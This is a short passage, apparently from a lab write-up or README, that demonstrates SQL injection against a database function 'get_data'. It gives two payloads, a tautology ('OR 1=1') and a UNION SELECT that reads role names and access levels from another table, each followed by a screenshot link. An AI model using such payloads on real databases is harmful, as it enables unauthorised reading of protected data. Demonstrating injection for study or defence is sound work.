    SELECT * FROM get_data('1'' OR 1=1 -- ');
<img width="565" alt="2-2-2-1" src="https://user-images.githubusercontent.com/55449630/206282895-a10ae21f-c0cb-4736-a6ab-024a06ecd390.png">

    SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');
<img width="565" alt="2-2-2-2" src="https://user-images.githubusercontent.com/55449630/206282912-a64c165b-031e-4e35-b8bb-ddd3f365d324.png">
